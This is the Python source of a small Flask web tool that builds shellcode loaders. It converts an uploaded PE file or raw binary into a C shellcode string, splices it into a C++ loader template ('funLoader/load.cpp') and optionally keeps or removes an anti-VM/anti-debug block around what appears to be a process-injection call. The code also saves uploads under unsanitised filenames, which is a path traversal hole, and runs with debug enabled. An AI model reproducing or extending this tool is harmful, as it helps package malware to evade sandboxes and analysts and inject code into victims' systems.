from flask import Flask, request, jsonify, send_from_directory
import os
import subprocess
import re

app = Flask(__name__, static_folder='static')

# Create an 'uploads' directory if it doesn't exist
UPLOADS_DIR = 'uploads'
if not os.path.exists(UPLOADS_DIR):
    os.makedirs(UPLOADS_DIR)

def to_c_shellcode(data):
    """Converts a bytes object into a C-style shellcode string."""
    return "".join([f"\\x{byte:02x}" for byte in data])

def is_pe_file(data):
    """Checks if the file is a PE file by looking for the 'MZ' magic bytes."""
    return data.startswith(b'MZ')

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/uploads/<filename>')
def download_file(filename):
    return send_from_directory(UPLOADS_DIR, filename, as_attachment=True)

@app.route('/build', methods=['POST'])
def build():
    log = []
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file part in the request.'}), 400

        file = request.files['file']
        if file.filename == '':
            return jsonify({'error': 'No file selected.'}), 400

        # Save the uploaded file
        filepath = os.path.join(UPLOADS_DIR, file.filename)
        file.save(filepath)
        log.append({'msg': f"File '{file.filename}' uploaded successfully.", 'status': 'status-ok'})

        # Read the file content
        with open(filepath, 'rb') as f:
            file_content = f.read()

        # Process the file
        if is_pe_file(file_content):
            log.append({'msg': 'PE file detected. Treating as raw bytes for shellcode conversion.', 'status': 'status-process'})
        else:
            log.append({'msg': 'Raw binary detected. Formatting as shellcode.', 'status': 'status-process'})

        shellcode = to_c_shellcode(file_content)
        log.append({'msg': f'Shellcode generated ({len(file_content)} bytes).', 'status': 'status-ok'})

        # Dynamically modify the C++ source
        log.append({'msg': 'Modifying C++ source with new shellcode...', 'status': 'status-process'})
        with open('funLoader/load.cpp', 'r') as f:
            source_code = f.read()

        # Replace the payload using a lambda to avoid backslash issues
        source_code = re.sub(
            r'char payload\[\] = ".*";',
            lambda m: f'char payload[] = "{shellcode}";',
            source_code
        )

        # Check for Anti-VM/Debug option
        anti_vm_enabled = request.form.get('antiVm', 'true').lower() == 'true'
        if not anti_vm_enabled:
            log.append({'msg': 'Anti-VM/Debug option disabled. Bypassing checks.', 'status': 'status-process'})
            # Use markers to replace the anti-debug block
            source_code = re.sub(
                r'// ANTI_DEBUG_START.*// ANTI_DEBUG_END',
                'remInj();',
                source_code,
                flags=re.DOTALL
            )

        # Save the modified code to a new file
        modified_filename = f"load_{os.path.basename(filepath)}.cpp"
        modified_filepath = os.path.join(UPLOADS_DIR, modified_filename)
        with open(modified_filepath, 'w') as f:
            f.write(source_code)

        log.append({'msg': f'Modified C++ source saved to {modified_filename}', 'status': 'status-ok'})

        # Return the log and the URL to the modified C++ file
        return jsonify({
            'log': log,
            'downloadUrl': f'/uploads/{modified_filename}'
        })

    except Exception as e:
        log.append({'msg': f'An unexpected error occurred: {e}', 'status': 'status-error'})
        return jsonify({'error': f'Build failed: {e}', 'log': log}), 500


if __name__ == '__main__':
    app.run(debug=True, port=5000)